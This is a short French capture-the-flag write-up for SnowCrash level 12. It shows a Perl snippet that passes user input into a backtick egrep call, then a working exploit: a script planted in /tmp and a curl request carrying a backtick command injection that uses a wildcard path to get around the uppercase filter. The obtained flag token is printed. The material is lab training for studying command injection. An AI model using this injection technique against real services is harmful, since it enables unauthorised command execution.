
## Level12:

``` perl
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
```   
Ici le programme va supp les espaces et mettre les caracteres en majuscule avant d'ouvrir avec egrep.   
Il faut donc executer un programme dans notre fichier qui doit avoir un nom en maj :   

```bash
level12@SnowCrash:~$ echo "getflag > /tmp/key" > /tmp/TEST && chmod +x /tmp/TEST
level12@SnowCrash:~$ curl 'http://127.0.0.1:4646/?x=`/*/test`'
level12@SnowCrash:~$ cat /tmp/key
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```